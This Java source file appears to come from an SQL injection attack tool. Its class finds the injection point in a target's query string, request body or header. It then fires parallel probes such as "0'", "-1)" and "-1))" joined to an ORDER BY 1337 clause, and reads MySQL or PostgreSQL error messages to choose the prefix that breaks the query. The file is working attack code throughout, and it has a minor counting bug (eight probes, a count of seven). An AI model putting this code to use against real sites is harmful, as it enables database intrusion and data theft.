package com.jsql.model.suspendable;

import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.log4j.Logger;

import com.jsql.model.MediatorModel;
import com.jsql.model.exception.InjectionFailureException;
import com.jsql.model.exception.JSqlException;
import com.jsql.model.exception.StoppedByUserException;
import com.jsql.model.injection.method.MethodInjection;
import com.jsql.model.suspendable.callable.CallablePageSource;
import com.jsql.model.suspendable.callable.ThreadFactoryCallable;
import com.jsql.util.ConnectionUtil;

/**
 * Runnable class, define insertionCharacter that will be used by all futures requests,
 * i.e -1 in "[..].php?id=-1 union select[..]", sometimes it's -1, 0', 0, etc,
 * this class/function tries to find the working one by searching a special error message
 * in the source page.
 */
public class SuspendableGetCharInsertion extends AbstractSuspendable<String> {
	
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getRootLogger();

    /**
     * 
     */
    @Override
    public String run(Object... args) throws JSqlException {
        
        int nbStarInParameter = 0;
        
        if (ConnectionUtil.getQueryString().contains("*")) {
            nbStarInParameter++;
        }
        if (ConnectionUtil.getRequest().contains("*")) {
            nbStarInParameter++;
        }
        if (ConnectionUtil.getHeader().contains("*")) {
            nbStarInParameter++;
        }
        
        // Injection Point
        if (nbStarInParameter >= 2) {
            throw new InjectionFailureException("Character * must be used once in Query String, Request or Header parameters");
            
        } else if (
            ConnectionUtil.getQueryString().contains("*") 
            && ConnectionUtil.getMethodInjection() != MethodInjection.QUERY
        ) {
            throw new InjectionFailureException("Activate method GET to use character * or remove it from GET parameters");
            
        } else if (
            ConnectionUtil.getRequest().contains("*") 
            && ConnectionUtil.getMethodInjection() != MethodInjection.REQUEST
        ) {
            throw new InjectionFailureException("Activate one of Request method to use character * or remove it from Request parameters");
            
        } else if (
            ConnectionUtil.getHeader().contains("*") 
            && ConnectionUtil.getMethodInjection() != MethodInjection.HEADER
        ) {
            throw new InjectionFailureException("Activate method Header to use character * or remove it from Header parameters");
            
        } 
        
        // Query String
        else if (
            ConnectionUtil.getMethodInjection() == MethodInjection.QUERY 
            && (ConnectionUtil.getQueryString() == null || "".equals(ConnectionUtil.getQueryString()))
        ) {
            throw new InjectionFailureException("No query string");
            
        } else if (
            !"".equals(ConnectionUtil.getQueryString()) 
            && ConnectionUtil.getQueryString().matches("[^\\w]*=.*")
        ) {
            throw new InjectionFailureException("Incorrect Query String");
            
        } 
        
        // Request/Header data
        else if (
            !"".equals(ConnectionUtil.getRequest()) 
            && ConnectionUtil.getRequest().indexOf('=') < 0
        ) {
            throw new InjectionFailureException("Incorrect Request format");
            
        } else if (
            !"".equals(ConnectionUtil.getHeader()) 
            && ConnectionUtil.getHeader().indexOf(':') < 0
        ) {
            throw new InjectionFailureException("Incorrect Header format");
            
        // Parse query information: url=>everything before the sign '=',
        // start of query string=>everything after '='
        } else if (ConnectionUtil.getMethodInjection() == MethodInjection.QUERY) {
            if (ConnectionUtil.getQueryString().contains("*")) {
                return "";
            } else if (!ConnectionUtil.getQueryString().matches(".*=$")) {
                Matcher regexSearch = Pattern.compile("(.*=)(.*)").matcher(ConnectionUtil.getQueryString());
                regexSearch.find();
                try {
                    ConnectionUtil.setQueryString(regexSearch.group(1));
                    return regexSearch.group(2);
                } catch (IllegalStateException e) {
                    throw new InjectionFailureException("Incorrect Query String format", e);
                }
            }
            
        // Parse post information
        } else if (ConnectionUtil.getMethodInjection() == MethodInjection.REQUEST) {
            if (ConnectionUtil.getRequest().contains("*")) {
                return "";
            } else if (!ConnectionUtil.getRequest().matches(".*=$")) {
                Matcher regexSearch = Pattern.compile("(.*=)(.*)").matcher(ConnectionUtil.getRequest());
                regexSearch.find();
                try {
                    ConnectionUtil.setRequest(regexSearch.group(1));
                    return regexSearch.group(2);
                } catch (IllegalStateException e) {
                    throw new InjectionFailureException("Incorrect Request format", e);
                }
            }
        // Parse header information
        } else if (ConnectionUtil.getMethodInjection() == MethodInjection.HEADER) {
            if (ConnectionUtil.getHeader().contains("*")) {
                return "";
            } else if (!ConnectionUtil.getHeader().matches(".*:$")) {
                Matcher regexSearch = Pattern.compile("(.*:)(.*)").matcher(ConnectionUtil.getHeader());
                regexSearch.find();
                try {
                    ConnectionUtil.setHeader(regexSearch.group(1));
                    return regexSearch.group(2);
                } catch (IllegalStateException e) {
                    throw new InjectionFailureException("Incorrect Header format", e);
                }
            }
        }

        // Parallelize the search and let the user stops the process if needed.
        // SQL: force a wrong ORDER BY clause with an inexistent column, order by 1337,
        // and check if a correct error message is sent back by the server:
        //         Unknown column '1337' in 'order clause'
        // or   supplied argument is not a valid MySQL result resource
        ExecutorService taskExecutor = Executors.newCachedThreadPool(new ThreadFactoryCallable("CallableGetInsertionCharacter"));
        CompletionService<CallablePageSource> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
        for (String insertionCharacter : new String[] {"0", "0'", "'", "-1", "1", "\"", "-1)", "-1))"}) {
            taskCompletionService.submit(
                new CallablePageSource(
                    insertionCharacter + 
                    MediatorModel.model().vendor.instance().sqlOrderBy(),
                    insertionCharacter
                )
            );
        }

        int total = 7;
        while (0 < total) {

            if (this.isSuspended()) {
                throw new StoppedByUserException();
            }
            
            try {
                CallablePageSource currentCallable = taskCompletionService.take().get();
                total--;
                String pageSource = currentCallable.getContent();
                
                if (
                    // the correct character: mysql
                    Pattern.compile(".*Unknown column '1337' in 'order clause'.*", Pattern.DOTALL).matcher(pageSource).matches() || 
                    Pattern.compile(".*supplied argument is not a valid MySQL result resource.*", Pattern.DOTALL).matcher(pageSource).matches() ||

                    // the correct character: postgresql
                    Pattern.compile(".*ORDER BY position 1337 is not in select list.*", Pattern.DOTALL).matcher(pageSource).matches()
                ) {
                    return currentCallable.getInsertionCharacter();
                }
            } catch (InterruptedException | ExecutionException e) {
                LOGGER.error("Interruption while determining character injection", e);
            }
            
        }

        // Nothing seems to work, forces 1 has the character
        // TODO optional
        return "1";
    }
    
}